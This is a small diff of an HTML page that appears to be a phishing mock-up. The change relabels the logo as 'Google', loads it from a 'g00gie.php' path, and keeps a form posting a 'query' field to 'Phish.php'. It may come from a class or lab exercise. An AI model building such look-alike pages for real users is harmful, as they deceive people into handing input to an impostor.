@@ -2,14 +2,14 @@
 
 <body>
     <center>
-			<img src="g00gie.php/googlelogocolor_272×92dp.png" alt="Dawson logo" width="300" height="150"/>
-    </center>
-    <br/>
+			<img src="g00gie.php/googlelogocolor_272×92dp.png" alt="Google" width="300" height="150"/>
     
-    <form action="Phish.php" method="post">
-        <input type="text" name="query">
-    </form>    
-
+        <br/>
+    
+        <form action="Phish.php" method="post">
+            <input type="text" name="query">
+        </form>    
+    </center>
 
 </body>
 
